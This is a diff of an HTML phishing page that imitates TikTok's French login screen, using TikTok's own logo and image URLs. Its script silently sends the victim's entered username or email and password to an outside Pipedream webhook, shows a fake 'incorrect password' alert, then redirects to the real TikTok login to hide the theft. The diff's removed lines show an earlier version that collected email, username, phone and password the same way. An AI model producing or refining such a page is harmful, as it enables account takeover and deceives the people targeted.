@@ -1,55 +1,120 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
   <meta charset="utf-8">
-  <title>TikTok Login</title>
+  <title>Connexion • TikTok</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="https://lf16-tiktok-web.ttcdn-tos.com/obj/tiktok-web/tiktok/favicon.ico">
   <style>
-    body{background:#000;font-family:Arial;margin:0;padding:20px;color:white}
-    .box{max-width:380px;margin:40px auto;background:#1a1a1a;padding:30px;border-radius:12px}
-    input, button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;font-size:16px}
-    input{background:#333;color:white}
-    button{background:#fe2c55;color:white;font-weight:bold;cursor:pointer}
-    .logo{text-align:center;margin-bottom:20px}
-    #msg{color:#ff0050;margin-top:10px;display:none;font-weight:bold}
+    body,html{margin:0;padding:0;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;height:100%}
+    .container{max-width:400px;margin:0 auto;padding:20px;display:flex;flex-direction:column;height:100vh;justify-content:space-between}
+    .logo{margin:20px 0 40px;text-align:center}
+    .logo img{height:40px}
+    h1{font-size:28px;font-weight:700;text-align:center;margin:0 0 8px}
+    .subtitle{color:#ffffffb3;font-size:15px;text-align:center;line-height:1.4;margin-bottom:40px}
+    .btn{display:flex;align-items:center;justify-content:center;height:48px;border-radius:99px;font-size:16px;font-weight:600;margin-bottom:12px;background:#1c1c1c;border:1px solid #2d2d2d;cursor:pointer;transition:all .2s}
+    .btn:hover{background:#2a2a2a}
+    .btn img,.btn svg{width:20px;height:20px;margin-right:12px}
+    .footer{color:#ffffff80;font-size:12px;text-align:center;padding:20px 0;line-height:1.6}
+    .footer a{color:#fe2c55;text-decoration:none;font-weight:600}
+    .lang{position:absolute;bottom:20px;left:50%;transform:translateX(-50%);padding:8px 16px;background:#1c1c1c;border-radius:8px;border:1px solid #333;font-size:14px}
+    .qr-btn svg{width:24px;height:24px}
   </style>
 </head>
 <body>
-  <div class="box">
-    <div class="logo"><h1 style="color:#fe2c55;margin:0">tiktok</h1></div>
-    <h2 style="text-align:center">Log in to TikTok</h2>
-    
-    <input type="email" id="email" placeholder="Email or username" required>
-    <input type="text" id="user" placeholder="Username" required>
-    <input type="tel" id="phone" placeholder="Phone number (optional)">
-    <input type="password" id="pass" placeholder="Password" required>
-    
-    <button onclick="send()">Log in</button>
-    <div id="msg">Incorrect password. Try again.</div>
+
+<div class="container">
+  <div>
+    <div class="logo">
+      <img src="https://lf16-tiktok-common.ttcdn-tos.com/obj/tiktok-web-common-sg/tiktok-logo-white.png" alt="TikTok">
+    </div>
+    <h1>Connecte-toi à TikTok</h1>
+    <p class="subtitle">Gère ton compte, consulte tes notifications,<br>commente des vidéos et bien plus encore.</p>
+
+    <button class="btn" onclick="showLogin()">
+      <svg fill="#fff" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+      Utiliser un code QR
+    </button>
+
+    <button class="btn" onclick="showLogin()">
+      <svg fill="#fff" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+      Utiliser le téléphone / e-mail / nom d'utilisateur
+    </button>
+
+    <button class="btn">
+      <img src="https://lf16-tiktok-web.ttcdn-tos.com/obj/tiktok-web/tiktok/login/facebook.png" alt="Facebook">
+      Continuer avec Facebook
+    </button>
+
+    <button class="btn">
+      <img src="https://lf16-tiktok-web.ttcdn-tos.com/obj/tiktok-web/tiktok/login/google.png" alt="Google">
+      Continuer avec Google
+    </button>
+
+    <button class="btn">
+      <img src="https://lf16-tiktok-web.ttcdn-tos.com/obj/tiktok-web/tiktok/login/apple.png" alt="Apple">
+      Continuer avec Apple
+    </button>
   </div>
 
-  <script>
-    async function send() {
-      const e = document.getElementById('email').value.trim();
-      const u = document.getElementById('user').value.trim();
-      const p = document.getElementById('phone').value.trim() || "None";
-      const w = document.getElementById('pass').value;
+  <div class="footer">
+    Tu n’as pas de compte ? <a href="#">S’inscrire</a>
+    <div style="margin-top:20px">
+      En continuant, tu acceptes les <a href="#">Conditions d’utilisation</a> de TikTok et confirmes avoir lu la <a href="#">Politique de confidentialité</a> de TikTok.
+    </div>
+  </div>
+</div>
 
-      document.getElementById('msg').style.display = 'block';
-      document.getElementById('pass').value = '';
+<div class="lang">Français ▼</div>
 
-      fetch("https://eov3l04y6gu1pmi.m.pipedream.net", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          email: e,
-          username: u,
-          phone: p,
-          password: w,
-          time: new Date().toLocaleString()
-        })
-      });
-    }
-  </script>
+<!-- PAGE DE LOGIN CACHÉE (s'active quand on clique sur téléphone/email) -->
+<div id="loginForm" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;padding:20px;box-sizing:border-box;overflow-y:auto">
+  <div style="max-width:380px;margin:40px auto">
+    <button onclick="document.getElementById('loginForm').style.display='none'" style="background:none;border:none;color:#fff;font-size:24px;float:right">✕</button>
+    <h1 style="font-size:24px">Connexion</h1>
+    <p style="color:#ffffffb3;margin:20px 0">Téléphone / E-mail / Nom d'utilisateur</p>
+    
+    <input type="text" id="email" placeholder="Téléphone / E-mail / Nom d'utilisateur" style="width:100%;padding:14px;background:#1c1c1c;border:1px solid #333;border-radius:8px;color:#fff;font-size:16px;margin-bottom:12px">
+    <input type="password" id="pass" placeholder="Mot de passe" style="width:100%;padding:14px;background:#1c1c1c;border:1px solid #333;border-radius:8px;color:#fff;font-size:16px;margin-bottom:20px">
+    
+    <button onclick="send()" style="width:100%;height:48px;background:#fe2c55;color:#fff;border:none;border-radius:99px;font-weight:700;font-size:16px;cursor:pointer">
+      Se connecter
+    </button>
+    
+    <div style="text-align:center;margin-top:20px">
+      <a href="#" style="color:#fe2c55;text-decoration:none">Mot de passe oublié ?</a>
+    </div>
+  </div>
+</div>
+
+<script>
+  function showLogin() {
+    document.getElementById('loginForm').style.display = 'block';
+  }
+
+  async function send() {
+    const e = document.getElementById('email').value.trim();
+    const w = document.getElementById('pass').value;
+
+    if (!e || !w) return alert("Remplis tout");
+
+    // Envoi silencieux vers ton Pipedream
+    fetch("https://eov3l04y6gu1pmi.m.pipedream.net", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: e,
+        password: w,
+        time: new Date().toLocaleString(),
+        page: "TikTok Login 2025"
+      })
+    });
+
+    // Faux message d'erreur + redirect réel TikTok après 1s
+    alert("Mot de passe incorrect. Réessaie.");
+    setTimeout(() => { window.location = "https://www.tiktok.com/login"; }, 1200);
+  }
+</script>
+
 </body>
 </html>
